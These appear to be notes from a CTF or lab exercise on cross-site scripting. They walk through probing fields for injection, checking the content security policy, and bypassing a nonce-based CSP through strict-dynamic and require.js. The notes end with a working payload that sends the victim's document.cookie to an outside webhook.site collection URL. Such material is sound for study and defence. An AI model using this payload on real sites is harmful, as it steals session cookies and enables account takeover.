#The piece of source code that has to be read for an xss attack is always inside the page.

#We may need a server to hook our requests. There is requestbin.net or as an alternative webhook.site to intercept the cookie we want to obtain

#1- Look if there is a possible code injection <script src='data:1,alert(1)' async='true'></script>
#In the first page we put that code in every field but nothing strage happened.
#We try again in the second page but nothing happens.
#If there is red stuff in the console which states the content security policy
#Then we know that some vulnerability has been mitigated by it.
#Another way to check Content security policy is to check in the network tab of the browser.
#And look at the header of requests there.

#2- We can retry but adding some text that's different for every field in order to distinguish them.
#If cookies are tracking me I can check that by copying and pasting the same link into a new browser page in private mode. The admin will see the same things I see .

#3-Check for know vulnerable libraries https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt and try if they work
#And we need some code to inject

#4- In this case the csp is using a nonce based mitigation. Very hard to bypass but we are lucky that the strict-dynamic is implemented. 
#strict-dynamic allows trust propagation to scripts coming from trusted sources (and it's exploitable).

#Use => document.cookie = {"asdasd":"asdasd"} to add a cookie with the console
#Use a plugin to modify the cookie
#Out hook bot link https://webhook.site/4b9bb9bc-b11f-4aff-a494-0688d9d67c98/

"""
<script data-main="data:1,document.location='https://webhook.site/4b9bb9bc-b11f-4aff-a494-0688d9d67c98/?'+document.cookie" src='require.js'></script>
"""

#This script rely on the fact that the website attacked load the require.js library. (Many websites do that)
